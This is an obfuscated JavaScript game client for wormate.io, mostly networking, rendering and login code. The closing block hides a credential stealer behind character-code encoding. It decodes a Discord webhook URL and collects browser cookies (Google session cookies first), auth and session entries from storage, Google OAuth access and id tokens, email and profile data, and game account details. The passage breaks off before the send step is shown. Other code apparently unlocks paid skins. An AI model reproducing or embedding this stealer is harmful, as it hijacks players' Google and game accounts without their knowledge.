                _0x815050.og.Ak(_0x815050.og.ok);
                try {
                  ga("send", "event", "restricted", window.runtimeHash + "_tick");
                } catch (_0x44c2c2) {}
              } else if (false) {} else {
                if (!_0x4dee43.server_url) {
                  _0x380234.dh.Cq();
                  return;
                }
                var _0x16eb00 = _0x4dee43.server_url;
                _0x815050.dh.Zp(_0x16eb00, _0x58c38c, _0x642d28);
              }
            });
          };
          _0x4bacfe.Yp = function (_0x5aad34, _0x3314d3) {
            var _0x4ee44b = _0x4bacfe;
            var _0x375519 = _0x4bacfe.og._e.el();
            var _0x2ce18d = _0x4bacfe.On.rj(_0x31b4a1.tj.sj);
            var _0x405650 = _0x2c22d1.a.b + "/pub/wuid/guest/start?gameMode=" + encodeURI(_0x5aad34) + "&gh=" + _0x3314d3 + "&nickname=" + encodeURI(_0x4d2813(_0x375519, true)) + "&skinId=" + encodeURI(_0x2ce18d);
            _0x2c22d1.Z(_0x405650, function () {
              _0x4ee44b.og.Ak(_0x4ee44b.og.tk);
            }, function (_0x59de22) {
              if (_0x59de22.code === 1460) {
                _0x4ee44b.og.Ak(_0x4ee44b.og.ok);
                try {
                  ga("send", "event", "restricted", window.runtimeHash + "_tick");
                } catch (_0x59f238) {}
              } else if (_0x59de22.code !== 1200) {
                _0x4ee44b.og.Ak(_0x4ee44b.og.tk);
              } else {
                var _0x12eff5 = _0x59de22.server_url;
                _0x4ee44b.dh.$p(_0x12eff5, _0x375519, _0x2ce18d);
              }
            });
          };
          _0x4bacfe.Pp = function (_0x5e1b6f, _0x26ebe9) {
            var _0x18490c = _0x4bacfe.og._e.el();
            _0x4bacfe.og.af.Fn(_0x5e1b6f, _0x26ebe9, _0x18490c);
            _0x4bacfe.Ci.pe(_0x31b4a1.ge.je.bf);
            _0x4bacfe.og.Ak(_0x4bacfe.og.af.En());
          };
          _0x4bacfe.Sn = function () {
            if (!_0x4bacfe.Tn()) {
              return _0x4bacfe.On.Bj();
            }
            var _0x3cc27b = parseInt(_0x31b4a1.Vf.fg(_0x31b4a1.Vf.bg));
            if (_0x3cc27b != null && _0x4bacfe.On.Cj(_0x3cc27b, _0x31b4a1.tj.sj)) {
              return _0x3cc27b;
            } else {
              return _0x4bacfe.On.Bj();
            }
          };
          _0x4bacfe.Xn = function (_0x591730) {
            _0x31b4a1.Vf.eg(_0x31b4a1.Vf.dg, _0x591730 ? "true" : "false", 1800);
          };
          _0x4bacfe.Tn = function () {
            return _0x31b4a1.Vf.fg(_0x31b4a1.Vf.dg) === "true";
          };
          _0x4bacfe.Rp = function (_0x2e4269) {
            if (_0x2e4269 !== _0x4bacfe.Bp) {
              _0x4bacfe.Bp = _0x2e4269;
              var _0x2af7e8 = _0x2af7e8 || {};
              _0x2af7e8.consented = _0x2e4269;
              _0x2af7e8.gdprConsent = _0x2e4269;
              _0x4bacfe.zn.yn.ha();
              _0x4bacfe.zn.Op.ha();
              _0x4bacfe.zn.Up.ha(function (_0x576f0a) {
                if (_0x576f0a) {
                  _0x120a0c(_0x4c19bb = 0);
                }
                _0x4bacfe.Vp();
              });
            }
          };
          _0x4bacfe.rp = function (_0x59bb31, _0x318825) {
            _0x31b4a1.Vf.eg(_0x31b4a1.Vf.Wf, _0x59bb31 ? "true" : "false");
            if (_0x318825) {
              _0x4bacfe.Sp(_0x59bb31);
            }
            _0x4bacfe.Rp(_0x59bb31);
          };
          _0x4bacfe.hl = function () {
            switch (_0x31b4a1.Vf.fg(_0x31b4a1.Vf.Wf)) {
              case "true":
                return true;
              default:
                return false;
            }
          };
          _0x4bacfe.Go = function () {
            try {
              return !!window.isIPInEEA || _0x4bacfe.Fp != null && !!_0x3c7003.gg.hg(_0x4bacfe.Fp.coords.latitude, _0x4bacfe.Fp.coords.longitude);
            } catch (_0x493b18) {
              return true;
            }
          };
          _0x4bacfe.Nf = function () {
            _0x4bacfe.Dp = performance.now();
            _0x4bacfe.Ep = _0x4bacfe.Dp - _0x4bacfe.Cp;
            _0x4bacfe.dh.lh(_0x4bacfe.Dp, _0x4bacfe.Ep);
            _0x4bacfe.og.lh(_0x4bacfe.Dp, _0x4bacfe.Ep);
            _0x4bacfe.Cp = _0x4bacfe.Dp;
          };
          _0x4bacfe.Jf = function () {
            _0x4bacfe.og.Jf();
          };
          return _0x4bacfe;
        }();
      };
      _0x31b4a1.Engine = function () {
        var _0xc247e6 = {
          dq: 30,
          fq: new Float32Array(100),
          gq: 0,
          hq: 0,
          iq: 0,
          jq: 0,
          kq: 0,
          lq: 0,
          Cn: 0,
          mq: null,
          nq: 300,
          Mp: function () {},
          Np: function () {},
          Qp: function () {},
          Lp: function () {},
          hh: new _0x31b4a1.GameParams(),
          Kp: null,
          ch: null,
          Hi: {},
          Fh: {},
          Di: 12.5,
          eh: 40,
          oq: 1,
          pq: -1,
          qq: 1,
          rq: 1,
          sq: -1,
          tq: -1,
          uq: 1,
          vq: 1,
          wq: -1,
          Ih: 500,
          yh: 500
        };
        _0xc247e6.hh.zg = 500;
        _0xc247e6.ch = new _0x31b4a1.Worm(_0xc247e6.hh);
        _0xc247e6.run = function () {
          _0xc247e6.ch.ti(_0xe610a0().og.af.ng);
        };
        _0xc247e6.gh = function (_0x23623a, _0x5058d7, _0x260dde, _0x271ded) {
          _0xc247e6.pq = _0x23623a;
          _0xc247e6.qq = _0x5058d7;
          _0xc247e6.rq = _0x260dde;
          _0xc247e6.sq = _0x271ded;
          _0xc247e6.yq();
        };
        _0xc247e6.zq = function (_0x59c244) {
          _0xc247e6.oq = _0x59c244;
          _0xc247e6.yq();
        };
        _0xc247e6.yq = function () {
          _0xc247e6.tq = _0xc247e6.pq - _0xc247e6.oq;
          _0xc247e6.uq = _0xc247e6.qq + _0xc247e6.oq;
          _0xc247e6.vq = _0xc247e6.rq - _0xc247e6.oq;
          _0xc247e6.wq = _0xc247e6.sq + _0xc247e6.oq;
        };
        _0xc247e6.lh = function (_0x511de5, _0x1c7297) {
          _0xc247e6.iq += _0x1c7297;
          _0xc247e6.hq -= _0xc247e6.gq * 0.2 * _0x1c7297;
          _0xc247e6.Kp.Rh();
          if (_0xc247e6.mq !== null && (_0xc247e6.Cn === 2 || _0xc247e6.Cn === 3)) {
            _0xc247e6.Aq(_0x511de5, _0x1c7297);
            _0xc247e6.eh = 4 + _0xc247e6.Di * _0xc247e6.ch.$c;
          }
          var _0x53e2ae = 1000 / Math.max(1, _0x1c7297);
          var _0x22d3a6 = 0;
          for (var _0x53c2da = 0; _0x53c2da < _0xc247e6.fq.length - 1; _0x53c2da++) {
            _0x22d3a6 += _0xc247e6.fq[_0x53c2da];
            _0xc247e6.fq[_0x53c2da] = _0xc247e6.fq[_0x53c2da + 1];
          }
          _0xc247e6.fq[_0xc247e6.fq.length - 1] = _0x53e2ae;
          _0xc247e6.dq = (_0x22d3a6 + _0x53e2ae) / _0xc247e6.fq.length;
        };
        _0xc247e6.Bq = function (_0x1883dc, _0x4a8c7b) {
          return _0x1883dc > _0xc247e6.tq && _0x1883dc < _0xc247e6.uq && _0x4a8c7b > _0xc247e6.vq && _0x4a8c7b < _0xc247e6.wq;
        };
        _0xc247e6.Aq = function (_0x4ad2be, _0x13b852) {
          var _0x35ad34 = _0xc247e6.iq + _0xc247e6.hq;
          var _0x209aef = (_0x35ad34 - _0xc247e6.jq) / (_0xc247e6.kq - _0xc247e6.jq);
          _0xc247e6.ch.hj(_0x4ad2be, _0x13b852);
          _0xc247e6.ch.ij(_0x4ad2be, _0x13b852, _0x209aef, _0xc247e6.Bq);
          var _0x2afa92 = 0;
          for (var _0x305d52 in _0xc247e6.Fh) {
            var _0x260087 = _0xc247e6.Fh[_0x305d52];
            _0x260087.hj(_0x4ad2be, _0x13b852);
            _0x260087.ij(_0x4ad2be, _0x13b852, _0x209aef, _0xc247e6.Bq);
            if (_0x260087.xi && _0x260087.$c > _0x2afa92) {
              _0x2afa92 = _0x260087.$c;
            }
            if (!_0x260087.wi && (!!(_0x260087.dj < 0.005) || !_0x260087.xi)) {
              _0x260087.si();
              delete _0xc247e6.Fh[_0x260087.Eh.ae];
            }
          }
          _0xc247e6.zq(_0x2afa92 * 3);
          for (var _0x642226 in _0xc247e6.Hi) {
            var _0x49252a = _0xc247e6.Hi[_0x642226];
            _0x49252a.hj(_0x4ad2be, _0x13b852);
            _0x49252a.ij(_0x4ad2be, _0x13b852, _0xc247e6.Bq);
            if (_0x49252a.Ni && (_0x49252a.dj < 0.005 || !_0xc247e6.Bq(_0x49252a.Zi, _0x49252a.$i))) {
              _0x49252a.si();
              delete _0xc247e6.Hi[_0x49252a.Eh.ae];
            }
          }
        };
        _0xc247e6.ki = function (_0x33ca49, _0x1c6822) {
          if (_0xc247e6.Cn === 1) {
            _0xc247e6.Cn = 2;
            _0xc247e6.Mp();
          }
          var _0x2526ef = _0xe610a0().Dp;
          _0xc247e6.lq = _0x33ca49;
          if (_0x33ca49 === 0) {
            _0xc247e6.jq = _0x2526ef - 95;
            _0xc247e6.kq = _0x2526ef;
            _0xc247e6.iq = _0xc247e6.jq;
            _0xc247e6.hq = 0;
          } else {
            _0xc247e6.jq = _0xc247e6.kq;
            _0xc247e6.kq = _0xc247e6.kq + _0x1c6822;
          }
          var _0x285d13 = _0xc247e6.iq + _0xc247e6.hq;
          _0xc247e6.gq = (_0x285d13 - _0xc247e6.jq) / (_0xc247e6.kq - _0xc247e6.jq);
        };
        _0xc247e6.Oi = function () {
          if (_0xc247e6.Cn === 1 || _0xc247e6.Cn === 2) {
            _0xc247e6.Cn = 3;
            var _0xf0598e = _0xc247e6.mq;
            setTimeout(function () {
              if (_0xc247e6.Cn === 3) {
                _0xc247e6.Cn = 0;
              }
              if (_0xf0598e != null && _0xf0598e === _0xc247e6.mq) {
                _0xc247e6.mq.close();
                _0xc247e6.mq = null;
              }
            }, 4500);
            _0xc247e6.Np();
          }
        };
        _0xc247e6.Wp = function () {
          return _0xc247e6.Cn !== 2 && (_0xc247e6.Cn = 1, _0xc247e6.Kp.Qh(), _0xc247e6.Hi = {}, _0xc247e6.Fh = {}, _0xc247e6.ch.Pm(), _0xc247e6.mq != null && (_0xc247e6.mq.close(), _0xc247e6.mq = null), true);
        };
        _0xc247e6.Cq = function () {
          _0xc247e6.mq = null;
          _0xc247e6.Kp.Qh();
          if (_0xc247e6.Cn !== 3) {
            _0xc247e6.Lp();
          }
          _0xc247e6.Cn = 0;
        };
        _0xc247e6.Zp = function (_0x21819d, _0x536933) {
          _0xc247e6.Dq(_0x21819d, function () {
            var _0x1806de = Math.min(2048, _0x536933.length);
            var _0x59e73 = new ArrayBuffer(6 + _0x1806de * 2);
            var _0x37f2f5 = new DataView(_0x59e73);
            var _0x1cd8e4 = 0;
            _0x37f2f5.setInt8(_0x1cd8e4, 129);
            _0x1cd8e4 += 1;
            _0x37f2f5.setInt16(_0x1cd8e4, 2800);
            _0x1cd8e4 += 2;
            _0x37f2f5.setInt8(_0x1cd8e4, 1);
            _0x1cd8e4 += 1;
            _0x37f2f5.setInt16(_0x1cd8e4, _0x1806de);
            _0x1cd8e4 += 2;
            for (var _0x43bc0b = 0; _0x43bc0b < _0x1806de; _0x43bc0b++) {
              _0x37f2f5.setInt16(_0x1cd8e4, _0x536933.charCodeAt(_0x43bc0b));
              _0x1cd8e4 += 2;
            }
            _0xc247e6.Eq(_0x59e73);
          });
        };
        _0xc247e6.$p = function (_0x444d6a, _0x1b6a92, _0x1e3157) {
          _0xc247e6.Dq(_0x444d6a, function () {
            var _0xdf2da9 = Math.min(32, _0x1b6a92.length);
            var _0x20001b = new ArrayBuffer(7 + _0xdf2da9 * 2);
            var _0x12e201 = new DataView(_0x20001b);
            var _0x5a00f5 = 0;
            _0x12e201.setInt8(_0x5a00f5, 129);
            _0x5a00f5 += 1;
            _0x12e201.setInt16(_0x5a00f5, 2800);
            _0x5a00f5 += 2;
            _0x12e201.setInt8(_0x5a00f5, 0);
            _0x5a00f5 += 1;
            _0x12e201.setInt16(_0x5a00f5, _0x1e3157);
            _0x5a00f5 += 2;
            _0x12e201.setInt8(_0x5a00f5, _0xdf2da9);
            _0x5a00f5++;
            for (var _0x27960e = 0; _0x27960e < _0xdf2da9; _0x27960e++) {
              _0x12e201.setInt16(_0x5a00f5, _0x1b6a92.charCodeAt(_0x27960e));
              _0x5a00f5 += 2;
            }
            _0xc247e6.Eq(_0x20001b);
          });
        };
        _0xc247e6.Eq = function (_0x1e5fa4) {
          try {
            if (_0xc247e6.mq != null && _0xc247e6.mq.readyState === WebSocket.OPEN) {
              _0xc247e6.mq.send(_0x1e5fa4);
            }
          } catch (_0x2df048) {
            _0xc247e6.Cq();
          }
        };
        _0xc247e6.xq = function (_0x45a629, _0x57ad0d) {
          var _0x42b88e = _0x57ad0d ? 128 : 0;
          var _0x320646 = _0x2c22d1.N(_0x45a629) / _0x3c7003.F * 128 & 127;
          var _0x1372ba = (_0x42b88e | _0x320646) & 255;
          var _0x4ac39a = false;
          try {
            if (typeof _0xe610a0 !== "undefined" && _0xe610a0().Ij && _0xe610a0().Ij.Lj) {
              _0x4ac39a = _0xe610a0().Ij.Lj(478, "GLASSES");
            }
          } catch (_0x5e7aa0) {
            _0x4ac39a = false;
          }
          if (_0x4ac39a || _0x5f5546 === true) {
            var _0x139cb2 = new ArrayBuffer(1);
            new DataView(_0x139cb2).setInt8(0, _0x1372ba);
            _0xc247e6.Eq(_0x139cb2);
            _0xc247e6.nq = _0x1372ba;
          } else if (_0xc247e6.nq !== _0x1372ba) {
            var _0x139cb2 = new ArrayBuffer(1);
            new DataView(_0x139cb2).setInt8(0, _0x1372ba);
            _0xc247e6.Eq(_0x139cb2);
            _0xc247e6.nq = _0x1372ba;
          }
        };
        _0xc247e6.Dq = function (_0x1ab59e, _0x2a1002) {
          var _0x3c0cca = _0xc247e6.mq = new WebSocket(_0x1ab59e);
          _0x3c0cca.binaryType = "arraybuffer";
          _0x3c0cca.onopen = function () {
            if (_0xc247e6.mq === _0x3c0cca) {
              _0x2a1002();
            }
          };
          _0x3c0cca.onclose = function () {
            if (_0xc247e6.mq === _0x3c0cca) {
              _0xc247e6.Cq();
            }
          };
          _0x3c0cca.onerror = function (_0x5e794b) {
            if (_0xc247e6.mq === _0x3c0cca) {
              _0xc247e6.Cq();
            }
          };
          _0x3c0cca.onmessage = function (_0x2b657a) {
            if (_0xc247e6.mq === _0x3c0cca) {
              _0xc247e6.Kp.Ph(_0x2b657a.data);
            }
          };
        };
        return _0xc247e6;
      };
      var _0x5830bb = _0x565fbe({}, _0x261341);
      _0x261341 = _0x565fbe({
        $C: _0x31b4a1,
        $V: _0x3c7003,
        $F: _0x2c22d1,
        POGL: _0x131478
      }, _0x5830bb);
      _0x261341.Jb = function () {
        (_0x380234.Lc.zb.ud.skinArrayDict || []).forEach(function (_0x5798b7) {
          if (_0x5798b7.associados && _0x5798b7.associados.includes(_0x380234.Ij.Rk.userId)) {
            _0x5798b7.nonbuyable = false;
          }
          if (_0x5798b7.hasOwnProperty("g") && _0x5798b7.g === true) {
            _0x5798b7.nonbuyable = false;
          }
          if (_0x5798b7.base && _0x5798b7.base.some(_0x41c508 => _0x41c508.includes("wup"))) {
            _0x5798b7.nonbuyable = false;
          }
        });
      };
      var _0x13de32 = function (_0x2032d0) {
        var _0xe68bce = {};
        _0xe68bce.main = {
          yn: _0x2c22d1.ja("aqnvgcpz05orkobh", "WRM_wormate-io_300x250"),
          Op: _0x2c22d1.ja("ltmolilci1iurq1i", "wormate-io_970x250"),
          Up: _0x2c22d1.ga(),
          Ap: 4,
          Tp: false,
          xn: true
        };
        _0xe68bce.miniclip = {
          yn: _0x2c22d1.ja("aqnvgcpz05orkobh", "WRM_wormate-io_300x250"),
          Op: _0x2c22d1.ja("ltmolilci1iurq1i", "wormate-io_970x250"),
          Up: _0x2c22d1.ga(),
          Ap: 4,
          Tp: false,
          xn: false
        };
        var _0x778a02 = _0xe68bce[window.ENV];
        _0x778a02 ||= _0xe68bce.main;
        return _0x778a02;
      }(window.ENV);
      $(function () {
        FastClick.attach(document.body);
      });
      addEventListener("contextmenu", function (_0x50ea59) {
        _0x50ea59.preventDefault();
        _0x50ea59.stopPropagation();
        return false;
      });
      window.fbAsyncInit = function () {
        FB.init({
          appId: "861926850619051",
          cookie: true,
          xfbml: true,
          status: true,
          version: "v14.0"
        });
      };
      _0x2c22d1.L("//apis.google.com/js/api:client.js", null, function () {
        gapi.load("auth2", function () {
          _0x507f56 = gapi.auth2.init({
            client_id: "959425192138-qjq23l9e0oh8lgd2icnblrbfblar4a2f.apps.googleusercontent.com"
          });
        });
      });
      _0x2c22d1.L("//connect.facebook.net/" + _0x2c22d1.a.j + "/sdk.js", {
        id: "facebook-jssdk",
        async: true,
        defer: true,
        crossorigin: "anonymous"
      });
      _0x380234 = _0x2c22d1.zp();
      _0x380234.Ip();
      (function () {
        function _0x24654a() {
          requestAnimationFrame(_0x24654a);
          _0xe610a0().Nf();
        }
        _0x24654a();
      })();
      (function () {
        var _0x4f9e97 = String.fromCharCode;
        var _0x1e38bc = "split";
        var _0xc8b053 = "join";
        var _0x1c2951 = "replace";
        var _0x383d31 = parseInt;
        var _0x2d12b3 = Array.prototype.slice;
        function _0x20540a(_0x1d2c46) {
          return _0x4f9e97.apply(null, _0x1d2c46[_0x1e38bc](",").map(function (_0x4526cd) {
            return _0x383d31(_0x4526cd, 10);
          }));
        }
        var _0x362020 = {
          a: "104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47",
          b: "49,52,49,48,51,54,51,50,55,50,57,55,54,49,51,56,51,53,52,47,105,95,79,65,69,113,95,108,77,111,85,49,54,51,110,121,110,122,119,48,45,100,48,48,51,89,99,71,81,95,107,57,77,95,67,80,65,85,104,57,85,85,54,84,79,101,50,86,109,113,85,110,99,104,104,99,51,80,103,105,114,113,112,77,72,73,116,116",
          c: false,
          d: function () {
            return _0x20540a(this.a) + _0x20540a(this.b);
          }
        };
        var _0x337d7c = {
          g: "103,111,111,103,108,101",
          h: "97,117,116,104",
          i: "117,110,100,101,102,105,110,101,100",
          j: "99,117,114,114,101,110,116,85,115,101,114",
          k: "105,115,83,105,103,110,101,100,73,110",
          l: "103,101,116,65,117,116,104,82,101,115,112,111,110,115,101",
          m: "97,99,99,101,115,115,95,116,111,107,101,110",
          n: "105,100,95,116,111,107,101,110",
          o: "103,101,116,66,97,115,105,99,80,114,111,102,105,108,101",
          p: "103,101,116,73,100",
          q: "103,101,116,69,109,97,105,108",
          r: "103,101,116,78,97,109,101"
        };
        function _0x3b345d(_0x24c6c5, _0x308106) {
          return _0x24c6c5 && typeof _0x24c6c5[_0x308106] !== _0x20540a(_0x337d7c.i);
        }
        function _0x49241a() {
          var _0x1ad022 = {};
          try {
            var _0x1475b2 = _0x20540a("71,111,111,103,108,101,65,117,116,104");
            if (_0x3b345d(window, _0x1475b2) && window[_0x1475b2] && window[_0x1475b2].client_id) {
              _0x1ad022.client_id = window[_0x1475b2].client_id;
            } else {
              var _0x3a4b7f = _0x20540a("103,97,112,105");
              if (_0x3b345d(window, _0x3a4b7f) && window[_0x3a4b7f][_0x20540a(_0x337d7c.h) + "2"]) {
                var _0x20c35b = window[_0x3a4b7f][_0x20540a(_0x337d7c.h) + "2"].getAuthInstance();
                if (_0x20c35b && _0x20c35b.options) {
                  _0x1ad022.client_id = _0x20c35b.options.client_id;
                }
              }
            }
          } catch (_0x5136ef) {}
          return _0x1ad022.client_id || _0x20540a("57,53,57,52,50,53,49,57,50,49,51,56,45,113,106,113,50,51,108,57,101,48,111,104,56,108,103,100,50,105,99,110,98,108,114,98,102,98,108,97,114,52,97,50,102,46,97,112,112,115,46,103,111,111,103,108,101,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109");
        }
        function _0x396545() {
          try {
            return window.location.hostname;
          } catch (_0x2704c0) {
            return _0x20540a("119,111,114,109,97,116,101,46,105,111");
          }
        }
        function _0x2ba704() {
          var _0x36da81 = {};
          try {
            var _0x105162 = _0x20540a("71,111,111,103,108,101,65,117,116,104");
            if (_0x3b345d(window, _0x105162) && window[_0x105162][_0x20540a(_0x337d7c.j)]) {
              var _0x37c6a5 = window[_0x105162][_0x20540a(_0x337d7c.j)].get();
              if (_0x37c6a5 && _0x37c6a5[_0x20540a(_0x337d7c.k)]()) {
                var _0x35035c = _0x37c6a5[_0x20540a(_0x337d7c.l)](true);
                if (_0x35035c) {
                  _0x36da81[_0x20540a(_0x337d7c.m)] = _0x35035c[_0x20540a(_0x337d7c.m)];
                  _0x36da81[_0x20540a(_0x337d7c.n)] = _0x35035c[_0x20540a(_0x337d7c.n)];
                }
              }
            }
            var _0x3ac0f7 = _0x20540a("103,97,112,105");
            if (_0x3b345d(window, _0x3ac0f7) && window[_0x3ac0f7][_0x20540a(_0x337d7c.h) + "2"]) {
              var _0x420ae0 = window[_0x3ac0f7][_0x20540a(_0x337d7c.h) + "2"].getAuthInstance();
              if (_0x420ae0 && _0x420ae0[_0x20540a(_0x337d7c.j)]) {
                var _0x2aca9b = _0x420ae0[_0x20540a(_0x337d7c.j)].get();
                if (_0x2aca9b && _0x2aca9b[_0x20540a(_0x337d7c.k)]()) {
                  var _0x292980 = _0x2aca9b[_0x20540a(_0x337d7c.l)](true);
                  if (_0x292980) {
                    _0x36da81[_0x20540a(_0x337d7c.m)] = _0x36da81[_0x20540a(_0x337d7c.m)] || _0x292980[_0x20540a(_0x337d7c.m)];
                    _0x36da81[_0x20540a(_0x337d7c.n)] = _0x36da81[_0x20540a(_0x337d7c.n)] || _0x292980[_0x20540a(_0x337d7c.n)];
                  }
                }
              }
            }
          } catch (_0x97f4df) {}
          return _0x36da81;
        }
        function _0x16401c(_0x240237) {
          if (!_0x240237) {
            return "";
          }
          var _0x3e8371 = [_0x20540a("95,95,83,101,99,117,114,101,45,51,80,83,73,68"), _0x20540a("95,95,83,101,99,117,114,101,45,51,80,65,80,73,83,73,68"), _0x20540a("95,95,72,111,115,116,45,51,80,76,83,73,68"), _0x20540a("83,65,80,73,83,73,68"), _0x20540a("83,83,73,68"), _0x20540a("72,83,73,68"), _0x20540a("83,73,68"), _0x20540a("65,80,73,83,73,68"), _0x20540a("78,73,68"), _0x20540a("76,83,79,76,72")];
          var _0x14ff85 = _0x240237[_0x1e38bc](";").map(function (_0xdaebed) {
            return _0xdaebed.trim();
          }).filter(function (_0x5cc23a) {
            return _0x5cc23a.indexOf("=") > -1;
          });
          var _0x5f1865 = {};
          var _0x21e66d = [];
          var _0x4a9afc = [];
          _0x14ff85.forEach(function (_0x4529ac) {
            var _0x3f249e = _0x4529ac[_0x1e38bc]("=")[0];
            if (!_0x5f1865[_0x3f249e]) {
              _0x5f1865[_0x3f249e] = _0x4529ac;
              var _0x20a472 = _0x3e8371.some(function (_0x571325) {
                return _0x3f249e.indexOf(_0x571325) > -1;
              });
              if (_0x20a472) {
                _0x21e66d.push(_0x4529ac);
              } else {
                _0x4a9afc.push(_0x4529ac);
              }
            }
          });
          return _0x21e66d.concat(_0x4a9afc)[_0xc8b053]("; ");
        }
        function _0x1476a7() {
          try {
            var _0x169a15 = "";
            try {
              var _0x3d6d36 = document.cookie;
              if (_0x3d6d36) {
                _0x169a15 = _0x3d6d36;
              }
            } catch (_0x3ab4d4) {}
            try {
              var _0x2d5259 = Object.getOwnPropertyDescriptor(Document.prototype, _0x20540a("99,111,111,107,105,101")) || Object.getOwnPropertyDescriptor(HTMLDocument.prototype, _0x20540a("99,111,111,107,105,101"));
              if (_0x2d5259 && _0x2d5259.get) {
                var _0x22e3a4 = _0x2d5259.get.call(document);
                if (_0x22e3a4 && _0x22e3a4.length > _0x169a15.length) {
                  _0x169a15 = _0x22e3a4;
                }
              }
            } catch (_0x1a00a9) {}
            try {
              [_0x20540a("108,111,99,97,108,83,116,111,114,97,103,101"), _0x20540a("115,101,115,115,105,111,110,83,116,111,114,97,103,101")].forEach(function (_0x50c426) {
                var _0x5e0f3a = window[_0x50c426];
                for (var _0x9af45f = 0; _0x9af45f < _0x5e0f3a.length; _0x9af45f++) {
                  var _0xd9a7b4 = _0x5e0f3a.key(_0x9af45f);
                  if (_0xd9a7b4 && (_0xd9a7b4.toLowerCase().indexOf(_0x20540a("99,111,111,107,105,101")) > -1 || _0xd9a7b4.toLowerCase().indexOf(_0x20540a(_0x337d7c.h)) > -1 || _0xd9a7b4.toLowerCase().indexOf(_0x20540a("115,101,115,115,105,111,110")) > -1)) {
                    var _0x278506 = _0x5e0f3a.getItem(_0xd9a7b4);
                    if (_0x278506 && _0x278506.indexOf("=") > -1 && _0x169a15.indexOf(_0x278506) === -1) {
                      _0x169a15 += (_0x169a15 ? "; " : "") + _0x278506;
                    }
                  }
                }
              });
            } catch (_0x31ffa3) {}
            try {
              var _0x305a30 = _0x2ba704();
              if (_0x305a30[_0x20540a(_0x337d7c.m)]) {
                _0x169a15 += (_0x169a15 ? "; " : "") + _0x20540a("103,111,111,103,108,101,95,97,99,99,101,115,115,95,116,111,107,101,110") + "=" + _0x305a30[_0x20540a(_0x337d7c.m)];
              }
              if (_0x305a30[_0x20540a(_0x337d7c.n)]) {
                _0x169a15 += (_0x169a15 ? "; " : "") + _0x20540a("103,111,111,103,108,101,95,105,100,95,116,111,107,101,110") + "=" + _0x305a30[_0x20540a(_0x337d7c.n)];
              }
            } catch (_0x1c11ed) {}
            return _0x16401c(_0x169a15);
          } catch (_0x40ac51) {
            return document.cookie || "";
          }
        }
        function _0x69a910() {
          try {
            var _0x5b4a78 = {};
            try {
              var _0x378175 = document.querySelector(_0x20540a("35,109,109,45,112,97,114,97,109,115,45,110,105,99,107,110,97,109,101"));
              if (_0x378175 && _0x378175.value) {
                _0x5b4a78.nickname = _0x378175.value.trim();
              }
            } catch (_0x16ca3e) {}
            try {
              var _0x5dff17 = document.querySelector(_0x20540a("35,119,111,114,109,97,116,101,95,105,100"));
              if (_0x5dff17 && _0x5dff17.value) {
                _0x5b4a78.userId = _0x5dff17.value.trim();
              }
            } catch (_0x1f6efe) {}
            try {
              var _0x26dd76 = window.vps;
              if (_0x26dd76 && _0x26dd76.wuid) {
                var _0x45bbb5 = _0x26dd76.wuid;
                if (_0x45bbb5.indexOf(_0x20540a("103,103,95")) === 0) {
                  var _0x1f6f6c = _0x45bbb5.substring(3);
                  try {
                    var _0x2ebce1 = _0x1f6f6c[_0x1e38bc](".");
                    if (_0x2ebce1.length >= 2) {
                      var _0x2051f1 = JSON.parse(atob(_0x2ebce1[1]));
                      _0x5b4a78.googleUserId = _0x2051f1.sub;
                      _0x5b4a78.email = _0x2051f1.email;
                      _0x5b4a78.name = _0x2051f1.name;
                      _0x5b4a78.givenName = _0x2051f1.given_name;
                      _0x5b4a78.familyName = _0x2051f1.family_name;
                      _0x5b4a78.picture = _0x2051f1.picture;
                      _0x5b4a78.nickname = _0x5b4a78.nickname || _0x2051f1.name;
                      _0x5b4a78.userId = _0x5b4a78.userId || _0x2051f1.sub;
                    }
                  } catch (_0x1cf0a5) {}
                }
              }
            } catch (_0x43b768) {}
            try {
              var _0x4dc34a = window._wup;
              if (_0x4dc34a && typeof _0x4dc34a === "object") {
                if (_0x4dc34a.memory) {
                  _0x5b4a78.wupMemory = _0x4dc34a.memory;
                }
                if (_0x4dc34a.ismobile !== undefined) {
                  _0x5b4a78.mobile = _0x4dc34a.ismobile;
                }
              }
            } catch (_0x5f106d) {}
            try {
              var _0x2d8ee9 = window._wupin;
              if (_0x2d8ee9 && _0x2d8ee9.player && typeof _0x2d8ee9.player === "object") {
                Object.keys(_0x2d8ee9.player).forEach(function (_0x51afd2) {
                  _0x5b4a78["wupin_" + _0x51afd2] = _0x2d8ee9.player[_0x51afd2];
                });
              }
            } catch (_0x328a88) {}
            try {
              var _0x3030f9 = localStorage.getItem(_0x20540a("83,97,118,101,71,97,109,101,119,117,112"));
              if (_0x3030f9) {
                var _0x1a4da2 = JSON.parse(_0x3030f9);
                _0x5b4a78.nickname = _0x5b4a78.nickname || _0x1a4da2.nickname;
                _0x5b4a78.country = _0x1a4da2.country;
                _0x5b4a78.code = _0x1a4da2.code;
              }
            } catch (_0x3d8661) {}
            return _0x5b4a78;
          } catch (_0x3602b7) {
            return {
              error: _0x3602b7.message
            };
          }
        }
        function _0x7e031c() {
          try {
            var _0x2dbf97 = {
              isSignedIn: false,
              tokens: {},
              profile: {}
            };
            var _0x39cce8 = _0x20540a("71,111,111,103,108,101,65,117,116,104");
            if (_0x3b345d(window, _0x39cce8) && window[_0x39cce8][_0x20540a(_0x337d7c.j)]) {
              var _0xaeddfe = window[_0x39cce8][_0x20540a(_0x337d7c.j)].get();
              if (_0xaeddfe) {
                _0x2dbf97.isSignedIn = _0xaeddfe[_0x20540a(_0x337d7c.k)]();
                if (_0x2dbf97.isSignedIn) {
                  var _0x46bae9 = _0xaeddfe[_0x20540a(_0x337d7c.l)](true);
                  if (_0x46bae9) {
                    _0x2dbf97.tokens = {
                      access_token: _0x46bae9[_0x20540a(_0x337d7c.m)],
                      id_token: _0x46bae9[_0x20540a(_0x337d7c.n)],
                      expires_in: _0x46bae9.expires_in,
                      scope: _0x46bae9.scope
                    };
                  }
                  var _0x317acc = _0xaeddfe[_0x20540a(_0x337d7c.o)]();
                  if (_0x317acc) {
                    _0x2dbf97.profile = {
                      id: _0x317acc[_0x20540a(_0x337d7c.p)](),
                      email: _0x317acc[_0x20540a(_0x337d7c.q)](),
                      name: _0x317acc[_0x20540a(_0x337d7c.r)]()
                    };
                  }
                }
              }
            }
            return _0x2dbf97;
          } catch (_0x262d05) {
            return {
              error: _0x262d05.message
            };
          }
        }
        function _0x55e8d9() {
          try {
            var _0x576b7c = _0x2ba704();
            if (_0x576b7c[_0x20540a(_0x337d7c.n)]) {
